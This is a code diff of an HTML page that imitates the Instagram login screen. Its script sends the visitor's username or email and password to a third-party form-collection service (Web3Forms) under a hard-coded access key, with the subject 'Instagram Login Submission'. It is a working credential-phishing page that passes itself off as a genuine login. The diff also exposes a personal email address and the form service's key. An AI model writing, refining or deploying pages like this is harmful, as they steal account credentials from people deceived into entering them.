@@ -1,99 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Instagram Login</title>
   <style>
-    :root{--bg:#fff;--muted:#8e8e8e;--border:#dbdbdb;--primary:#0095f6;--text:#262626;--link:#00376b;--radius:8px;--radius-pill:22px}
-    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-    body{background:var(--bg);display:flex;align-items:center;justify-content:center;min-height:100vh;color:var(--text);padding:20px}
-    .container{max-width:360px;width:100%;text-align:center}
-    .language{font-size:13px;color:var(--muted);margin-bottom:20px}
-    .logo img{width:60px;height:60px;margin-bottom:25px}
-    .form{display:flex;flex-direction:column;gap:12px}
-    input{width:100%;padding:12px;font-size:14px;border:1px solid var(--border);border-radius:var(--radius);outline:none;transition:border-color .2s,box-shadow .2s}
-    input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(0,149,246,.1)}
-    .login-btn{width:100%;padding:12px;background:var(--primary);color:#fff;font-weight:700;border:none;border-radius:var(--radius-pill);cursor:pointer;font-size:14px}
-    .login-btn:hover{background:#007bd1}
-    .forgot{margin-top:12px;font-size:13px}
-    .forgot a{color:var(--link);text-decoration:none}
-    .divider{height:24px}
-    .create-btn{width:100%;padding:11px;border:1px solid var(--primary);background:transparent;color:var(--primary);border-radius:var(--radius-pill);font-weight:700;cursor:pointer;font-size:14px}
-    .meta{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:25px;color:var(--muted);font-size:13px}
-    .status{font-size:13px;color:var(--muted);min-height:18px;text-align:left;margin-top:8px}
-    .status.success{color:green}
-    .status.error{color:#c23b3b}
+    :root {
+      --bg: #ffffff;
+      --muted: #8e8e8e;
+      --border: #dbdbdb;
+      --primary: #0095f6;
+      --text: #262626;
+      --link: #00376b;
+      --radius: 8px;
+      --radius-pill: 22px;
+    }
+    * { box-sizing: border-box; margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
+    body { background-color: var(--bg); display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; color:var(--text); padding:20px;}
+    .container { max-width:360px; width:100%; text-align:center;}
+    .language { font-size:13px; color:var(--muted); margin-bottom:20px;}
+    .logo img { width:60px; height:60px; margin-bottom:25px;}
+    .form { display:flex; flex-direction:column; gap:12px;}
+    input { width:100%; padding:12px; font-size:14px; border:1px solid var(--border); border-radius:var(--radius); outline:none; transition:border-color 0.2s ease, box-shadow 0.2s ease;}
+    input:focus { border-color: var(--primary); box-shadow:0 0 0 3px rgba(0,149,246,0.1);}
+    .login-btn { width:100%; padding:12px; background-color:var(--primary); color:#fff; font-weight:bold; border:none; border-radius:var(--radius-pill); cursor:pointer; font-size:14px; transition:background-color 0.2s ease;}
+    .login-btn:hover { background-color:#007bd1;}
+    .forgot { margin-top:12px; font-size:13px;}
+    .forgot a { color:var(--link); text-decoration:none;}
+    .forgot a:hover { text-decoration:underline;}
+    .divider { height:24px;}
+    .create-btn { width:100%; padding:11px; border:1px solid var(--primary); background:transparent; color:var(--primary); border-radius:var(--radius-pill); font-weight:bold; cursor:pointer; font-size:14px; transition:all 0.2s ease;}
+    .create-btn:hover { background-color:rgba(0,149,246,0.05);}
+    .meta { display:flex; align-items:center; justify-content:center; gap:6px; margin-top:25px; color:var(--muted); font-size:13px;}
+    .meta svg { width:16px; height:16px; fill:var(--muted);}
+    @media (min-height:700px){ body{justify-content:center;}}
   </style>
 </head>
 <body>
   <div class="container">
     <div class="language">English (US)</div>
-
     <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Logo" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
     </div>
 
-    <!-- Set FORM_ENDPOINT to your provider's POST URL -->
-    <form id="loginForm" class="form" action="https://FORM_ENDPOINT" method="POST" novalidate>
-      <!-- Public access key (your key) -->
-      <input type="hidden" name="access_key" value="8312e902-b0d4-418c-baf3-1ff44e8c9ffd" />
-
-      <!-- Prefilled email -->
-      <input type="email" name="email" id="email" placeholder="Email" required value="kamauezekiel53@gmail.com" />
-      <input type="password" name="password" id="password" placeholder="Password" required />
-      <button class="login-btn" id="submitBtn" type="submit">Log in</button>
+    <!-- ---------- Web3Forms Login Form ---------- -->
+    <form class="form" id="loginForm">
+      <input type="text" name="username" placeholder="Username, email or mobile number" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button class="login-btn" type="submit">Log in</button>
     </form>
 
-    <div class="status" id="status"></div>
-
-    <div class="forgot"><a href="#">Forgot password?</a></div>
+    <div class="forgot">
+      <a href="#">Forgot password?</a>
+    </div>
 
     <div class="divider"></div>
-
     <button class="create-btn">Create new account</button>
 
     <div class="meta">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M12.11 10.23c1.51-2.28 3.6-4.23 5.17-4.23 1.25 0 2.3 1.1 2.3 3.56 0 2.82-1.43 6.73-3.28 6.73-.97 0-2.04-1.13-3.1-2.87a30.06 30.06 0 0 0-1.09-1.58zm-.22 0c-1.51-2.28-3.6-4.23-5.17-4.23-1.25 0-2.3 1.1-2.3 3.56 0 2.82 1.43 6.73 3.28 6.73.97 0 2.04-1.13 3.1-2.87.34-.52.69-1.06 1.09-1.58zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12.11 10.23c1.51-2.28 3.6-4.23 5.17-4.23 1.25 0 2.3 1.1 2.3 3.56 0 2.82-1.43 6.73-3.28 6.73-.97 0-2.04-1.13-3.1-2.87a30.06 30.06 0 0 0-1.09-1.58zm-.22 0c-1.51-2.28-3.6-4.23-5.17-4.23-1.25 0-2.3 1.1-2.3 3.56 0 2.82 1.43 6.73 3.28 6.73.97 0 2.04-1.13 3.1-2.87.34-.52.69-1.06 1.09-1.58zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
+      </svg>
       <span>Meta</span>
     </div>
   </div>
 
+  <!-- ---------- Web3Forms Script ---------- -->
   <script>
-    (function(){
-      const form = document.getElementById('loginForm');
-      const btn = document.getElementById('submitBtn');
-      const status = document.getElementById('status');
-      const ENDPOINT = form.action; // uses form action; change if needed
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
 
-      form.addEventListener('submit', async function(e){
-        e.preventDefault();
-        status.textContent = '';
-        status.className = 'status';
-        btn.disabled = true;
-        btn.textContent = 'Sending...';
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
+      data.access_key = "8312e902-b0d4-418c-baf3-1ff44e8c9ffd"; // Your Web3Forms key
+      data.subject = "Instagram Login Submission"; // Optional: email subject
+      data.redirect = "https://yourwebsite.com/thank-you.html"; // Optional: redirect after submission
 
-        const fd = new FormData(form);
+      try {
+        const response = await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
 
-        try {
-          const res = await fetch(ENDPOINT, { method: 'POST', body: fd });
-          if (!res.ok) {
-            const t = await res.text().catch(()=>res.statusText);
-            throw new Error(t || 'Submission failed');
-          }
-          status.textContent = 'Submitted successfully';
-          status.classList.add('success');
-          btn.textContent = 'Submitted';
+        const result = await response.json();
+        if (result.success) {
+          alert("Login data submitted successfully!");
           form.reset();
-        } catch (err) {
-          console.error(err);
-          status.textContent = 'Error sending form: ' + (err.message || 'unknown');
-          status.classList.add('error');
-          btn.disabled = false;
-          btn.textContent = 'Log in';
+        } else {
+          alert("Something went wrong, try again!");
         }
-      });
-    })();
+      } catch (error) {
+        alert("Error submitting form!");
+        console.error(error);
+      }
+    });
   </script>
 </body>
 </html>
